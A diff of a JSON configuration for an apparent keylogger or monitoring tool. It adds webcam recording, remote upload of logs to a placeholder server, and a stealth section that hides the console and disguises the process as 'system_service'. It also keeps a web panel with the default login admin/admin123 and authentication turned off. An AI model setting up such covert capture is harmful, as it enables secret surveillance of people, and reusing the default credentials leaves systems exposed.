@@ -1,7 +1,7 @@
 {
   "logging": {
     "level": "INFO",
-    "file_path": "logs/keylog.txt",
+    "file_path": "keylogger.log",
     "max_size_mb": 100,
     "buffer_size": 100,
     "flush_interval": 5.0,
@@ -18,16 +18,19 @@
     "keyboard": true,
     "mouse": true,
     "clipboard": true,
+    "window_tracking": true,
     "screenshots": true,
+    "camera": true,
     "usb_monitoring": true,
     "network_monitoring": true,
-    "window_tracking": true,
     "performance_monitoring": true
   },
   "privacy": {
     "sanitize_passwords": true,
     "hash_sensitive_data": true,
     "clipboard_max_length": 1000,
+    "max_text_length": 1000,
+    "sanitization_method": "hash",
     "excluded_applications": [
       "password_manager.exe",
       "keepass.exe",
@@ -45,25 +48,79 @@
       "cvv",
       "pin",
       "secret"
-    ]
+    ],
+    "log_mouse_coordinates": false,
+    "coordinate_precision": 10
   },
   "performance": {
+    "screenshot_interval": 15,
+    "window_check_interval": 1.0,
+    "clipboard_check_interval": 1.0,
+    "max_memory_usage_mb": 500,
+    "thread_pool_size": 4,
+    "text_flush_interval": 5.0,
+    "max_key_sequence": 100,
+    "typing_timeout": 2.0,
+    "mouse_move_threshold": 50,
+    "mouse_move_interval": 1.0,
+    "max_click_sequence": 50,
+    "double_click_threshold": 0.5,
+    "mouse_batch_size": 10,
+    "mouse_batch_timeout": 2.0,
     "keyboard_buffer_size": 1000,
     "mouse_buffer_size": 500,
-    "clipboard_check_interval": 1.0,
-    "screenshot_interval": 15,
     "usb_check_interval": 5.0,
-    "window_check_interval": 1.0,
-    "performance_check_interval": 30.0
+    "performance_check_interval": 30.0,
+    "buffer_size": 1000,
+    "flush_interval": 30
+  },
+  "remote": {
+    "enabled": false,
+    "server_url": "https://your-server.com/api/logs",
+    "api_key": "",
+    "upload_interval": 3600,
+    "compress_uploads": true
+  },
+  "alerts": {
+    "email_enabled": false,
+    "email_smtp_server": "smtp.gmail.com",
+    "email_smtp_port": 587,
+    "email_username": "",
+    "email_password": "",
+    "email_to": "",
+    "alert_on_startup": true,
+    "alert_on_errors": true
+  },
+  "stealth": {
+    "hide_console": false,
+    "process_name": "system_service",
+    "startup_delay": 30,
+    "auto_start": false
   },
   "web": {
     "enabled": true,
     "host": "127.0.0.1",
     "port": 5000,
     "debug": false,
-    "secret_key": "your-secret-key-change-in-production",
     "admin_username": "admin",
-    "admin_password": "admin123"
+    "admin_password": "admin123",
+    "secret_key": "your-secret-key-change-in-production",
+    "auth_enabled": false
+  },
+  "camera": {
+    "enabled": false,
+    "device_index": 0,
+    "segment_seconds": 60,
+    "fps": 15,
+    "width": 640,
+    "height": 480,
+    "resolution": "640x480",
+    "format": "mp4",
+    "codec": "mp4v",
+    "grayscale": false,
+    "blur": 0,
+    "encrypt": false,
+    "storage_path": "data/camera"
   },
   "ml": {
     "enabled": true,
@@ -95,7 +152,11 @@
         "threat": 0.3,
         "keystroke": 0.2,
         "context": 0.1
-      }
+      },
+      "baseline_window": null,
+      "drift_threshold": null,
+      "micro_batch_size": null,
+      "max_latency_ms": null
     },
     "interpretability": {
       "enabled": true,
